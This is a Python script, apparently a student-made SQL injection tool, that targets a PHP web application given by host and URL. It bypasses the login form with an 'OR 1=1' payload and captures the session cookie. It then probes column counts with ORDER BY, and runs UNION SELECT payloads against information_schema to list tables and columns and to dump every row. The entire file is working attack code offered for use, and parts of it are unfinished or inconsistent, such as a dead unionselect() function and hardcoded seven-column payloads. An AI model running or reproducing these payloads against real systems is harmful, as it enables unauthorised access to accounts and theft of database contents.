import getopt 
import sys
import requests
from bs4 import BeautifulSoup
import re
import time


s= requests.session()
column=0
csrf=" "
url=" "
target=" "
link=" "
db=0
tc=0
dump=0
linkawal=" "
flag=0
databasename=" "
tableSplit=[]
columnnameSplit=[]


def sql_injection():
    global link,csrf,s,linkawal
    linkawal=link
    link="http://"+target+"/"+"auth/auth.php"
    print("[*] Try Login the website using SQL Injection Attack")
    payload = {
                    'csrf_token' : csrf,
                    'username' :"'OR 1=1 LIMIT 1#",
                    'password' : "asd",
                    'action'  : "login"
                }

    request = s.post(link,data=payload)
    if(link==linkawal):
        print("[-] Failed to get authentication")
    else:
        print("[+] The website is vulnerable to SQL Injection Attack.\n[+] Successfully getting the website authentication with PHPSESSID value {}".format(s.cookies["PHPSESSID"]))


def url_validator():
    global target,url,link,csrf
    link="http://"+target+"/"+url
    request=s.get(link)
    if request.status_code != 200:
        print("[-] The requested URL not found")
        sys.exit()
    else :
        soup = BeautifulSoup(request.content,'html.parser')
        csrf = soup.find('input',{'name' : 'csrf_token'}).get('value')




def generate_total_column():
    global target,url,s,column,flag
    a=0
    start=time.time()
    print("[+] Generate total column for union-based SQL Injection Attack")
    temp="http://"+target+'/'+url+"%20ORDER%20BY%20"
    while time.time()-start<=10:
        a=a+1
        if(a==1):
            temp=temp+str(a)
        else:
            temp=temp+","+str(a)
        # print (temp)
        request = s.get(temp)
        soup = BeautifulSoup(request.content,'html.parser')
        page_link = soup.find('div', {"class": "container content"})
        content=page_link.text.strip()
        # print(content)
        if content=="":
            print("[+] Launch union-based SQL Injection Attack at URL "+"http://"+target+"/"+url)
            flag=1
            column=a-1
            break;
    if flag==0:
        print("[-] Processed for {} seconds and not able to determine the total column.\n[-] The target URL is not vulnerable to union-based SQL Injection Attack".format(time.time()-start))
    

def unionselect():
    global column,target,url
    a=1
    while a<column:
        if a==1:
            unionlink="http://"+target+"/"+url+"UNION SELECT"+str(a)
        else:
            unionlink="http://"+target+"/"+url+"UNION SELECT"+","+str(a)

def show_database_name():
    global databasename
    databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,database(),3,4,5,6,7"
    request=s.get(databaselink)
    soup = BeautifulSoup(request.content,'html.parser')
    database = soup.find('h3')
    # print(soup)
    databasename=database.text.strip()

    return databasename

def show_table_details():
    global tableSplit,columnnameSplit
    print("[+] Show the request result")
    print("="*100)
    databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(table_name),3,4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=database()"
    request=s.get(databaselink)
    soup = BeautifulSoup(request.content,'html.parser')
    tablename = soup.find('h3')
    tablenamestripped=tablename.text.strip()
    tableSplit = tablenamestripped.split(',')
    for index in range(len(tableSplit)):
        databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(create_time),3,4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20and%20table_name=\"{}\"".format(tableSplit[index])
        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        tabledate = soup.find('h3')
        tabledatestripped=tabledate.text.strip()

        
        databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(column_name),3,group_concat(data_type),5,6,7%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20and%20table_name=\"{}\"".format(tableSplit[index])
        # print(databaselink)
        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        columnname = soup.find('h3')
        columnnamestripped=columnname.text.strip()
        columnnameSplit = columnnamestripped.split(',')
        # print(columnnameSplit)


        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        vartype = soup.find('b')
        vartypestripped=vartype.text.strip()
        vartypeSplit = vartypestripped.split(',')
        # print(vartypeSplit)

        print("Table Name = {}".format(tableSplit[index]))
        print("Table Create Time = {}".format(tabledatestripped))
        print("[{} column(s)]".format(len(columnnameSplit)))
        print("="*100)
        print("Column Name \t Data Type")
        for index in range(len(columnnameSplit)):
            print("{}\t\t{}".format(columnnameSplit[index],vartypeSplit[index]))
        print("\n")


def table_dump():
    global tableSplit,columnnameSplit
    databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(table_name),3,4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=database()"
    request=s.get(databaselink)
    soup = BeautifulSoup(request.content,'html.parser')
    tablename = soup.find('h3')
    tablenamestripped=tablename.text.strip()
    tableSplit = tablenamestripped.split(',')


    for indexa in range(len(tableSplit)):
        print("[+] Show the request result")
        print("="*100)
        print("\n")
        print("Table Name = {}".format(tableSplit[indexa]))
        print("\n")
        print("Data Number {}".format(indexa+1))
        print("-"*20)
        databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(column_name),3,group_concat(data_type),5,6,7%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20and%20table_name=\"{}\"".format(tableSplit[indexa])
        # print(databaselink)
        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        columnname = soup.find('h3')
        columnnamestripped=columnname.text.strip()
        columnnameSplit = columnnamestripped.split(',')
        for indexb in range(len(columnnameSplit)):
            databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,"+columnnameSplit[indexb]+",3,4,5,6,7%20from%20"+tableSplit[indexa]
            # print(databaselink)
            request=s.get(databaselink)
            soup = BeautifulSoup(request.content,'html.parser')
            columnvalue = soup.find('h3')
            print("Column Name : {}".format(columnnameSplit[indexb]))
            if(columnvalue is None):
                print("Column Value : initialized")
            else:
                columnvaluestripped=columnvalue.text.strip()
                print("Column Value: {}".format(columnvaluestripped))

def tcdump():
    global tableSplit,columnnameSplit
    print("[+] Show the request result")
    print("="*100)
    databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(table_name),3,4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=database()"
    request=s.get(databaselink)
    soup = BeautifulSoup(request.content,'html.parser')
    tablename = soup.find('h3')
    tablenamestripped=tablename.text.strip()
    tableSplit = tablenamestripped.split(',')
    for indexa in range(len(tableSplit)):
        databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(create_time),3,4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20and%20table_name=\"{}\"".format(tableSplit[indexa])
        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        tabledate = soup.find('h3')
        tabledatestripped=tabledate.text.strip()

        
        databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(column_name),3,group_concat(data_type),5,6,7%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20and%20table_name=\"{}\"".format(tableSplit[indexa])
        # print(databaselink)
        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        columnname = soup.find('h3')
        columnnamestripped=columnname.text.strip()
        columnnameSplit = columnnamestripped.split(',')
        # print(columnnameSplit)


        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        vartype = soup.find('b')
        vartypestripped=vartype.text.strip()
        vartypeSplit = vartypestripped.split(',')
        # print(vartypeSplit)

        print("Table Name = {}".format(tableSplit[indexa]))
        print("Table Create Time = {}".format(tabledatestripped))
        print("[{} column(s)]".format(len(columnnameSplit)))
        print("="*100)
        print("Column Name \t Data Type")
        for indexb in range(len(columnnameSplit)):
            print("{}\t\t{}".format(columnnameSplit[indexb],vartypeSplit[indexb]))

   
        print("Data Number {}".format(indexa+1))
        print("-"*20)
        databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,group_concat(column_name),3,group_concat(data_type),5,6,7%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20and%20table_name=\"{}\"".format(tableSplit[indexa])
        # print(databaselink)
        request=s.get(databaselink)
        soup = BeautifulSoup(request.content,'html.parser')
        columnname = soup.find('h3')
        columnnamestripped=columnname.text.strip()
        columnnameSplit = columnnamestripped.split(',')
        for indexb in range(len(columnnameSplit)):
            databaselink="http://"+target+"/"+url+"%20UNION%20SELECT%201,"+columnnameSplit[indexb]+",3,4,5,6,7%20from%20"+tableSplit[indexa]
            # print(databaselink)
            request=s.get(databaselink)
            soup = BeautifulSoup(request.content,'html.parser')
            columnvalue = soup.find('h3')
            print("Column Name : {}".format(columnnameSplit[indexb]))
            if(columnvalue is None):
                print("Column Value : initialized")
            else:
                columnvaluestripped=columnvalue.text.strip()
                print("Column Value: {}".format(columnvaluestripped))
        print("\n")
        print("="*100)


def main():
    global url,target,db,tc,dump
    try:
        opts , argv = getopt.getopt(sys.argv[1:],"ht:u:",["help","target=","url=","db","tc","dump"])
        
        if not len(sys.argv[1:]):
            print("Usage: beo.py [-t/--target IP_Address/DNS] [-u/--url URL] [OPTIONS]")
            print("\t-h,--help\t\t\t\t\tShow basic help message and exit\n\t-t IP_Address/DNS --target=IP_Address/DNS\tSet IP Address or DNS (e.g 127.0.0.1)")
            print("\t-u URL, --url=URL\t\t\t\t\tSet website URL (e.g. web/index.php?id=1)")
            print("Options:\n\t--db\t\t\t\t\tShow the current database name\n\t--tc\t\t\t\t\tShow all tables name, table create time and columns from the current database\n\t--dump\t\t\t\t\tShow all the table name and entries data from the current database")
            print("Example:\nbeo.py -h\nbeo.py --help")
            print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --db\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --db")
            print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --tc\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --tc")
            print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --dump\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --dump")
            print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --db --tc --dump\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --db --tc --dump")
            sys.exit()
        
        
        for key,value in opts:
            if key in("-h","--help"):
                print("Usage: beo.py [-t/--target IP_Address/DNS] [-u/--url URL] [OPTIONS]")
                print("\t-h,--help\t\t\t\t\tShow basic help message and exit\n\t-t IP_Address/DNS --target=IP_Address/DNS\tSet IP Address or DNS (e.g 127.0.0.1)")
                print("\t-u URL, --url=URL\t\t\t\t\tSet website URL (e.g. web/index.php?id=1)")
                print("Options:\n\t--db\t\t\t\t\tShow the current database name\n\t--tc\t\t\t\t\tShow all tables name, table create time and columns from the current database\n\t--dump\t\t\t\t\tShow all the table name and entries data from the current database")
                print("Example:\nbeo.py -h\nbeo.py --help")
                print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --db\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --db")
                print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --tc\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --tc")
                print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --dump\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --dump")
                print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --db --tc --dump\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --db --tc --dump")
                sys.exit()
            elif key in("-t","--target"):
                target=value
            elif key in ("-u","--url"):
                url=value
            elif key in ("--db"):
                db=1
            elif key in ("--tc"):
                tc=1
            elif key in ("--dump"):
                dump=1
    except getopt.GetoptError:
        print("Usage: beo.py [-t/--target IP_Address/DNS] [-u/--url URL] [OPTIONS]")
        print("\t-h,--help\t\t\t\t\tShow basic help message and exit\n\t-t IP_Address/DNS --target=IP_Address/DNS\tSet IP Address or DNS (e.g 127.0.0.1)")
        print("\t-u URL, --url=URL\t\t\t\t\tSet website URL (e.g. web/index.php?id=1)")
        print("Options:\n\t--db\t\t\t\t\tShow the current database name\n\t--tc\t\t\t\t\tShow all tables name, table create time and columns from the current database\n\t--dump\t\t\t\t\tShow all the table name and entries data from the current database")
        print("Example:\nbeo.py -h\nbeo.py --help")
        print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --db\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --db")
        print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --tc\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --tc")
        print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --dump\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --dump")
        print("beo.py -t 127.0.0.1 -url=web/index.php?id=1 --db --tc --dump\nbeo.py --target 127.0.0.1 -url=web/index.php?id=1 --db --tc --dump")
        sys.exit()

    if (target==" " or url==" "):
        print("-t/--target or -u/--url argument is required")
        sys.exit()


    url_validator()
    sql_injection()
    generate_total_column()
    if(db==1):
        nama_db=show_database_name()
        print("Database Name: {}".format(nama_db))
        print("\n")
    if(tc==1):
        if(dump==1):
            tcdump()
        elif(dump==0):
            show_table_details()
    if(dump==1 and tc==0):
        table_dump()
        
  

            
    

if __name__ == "__main__":
    main()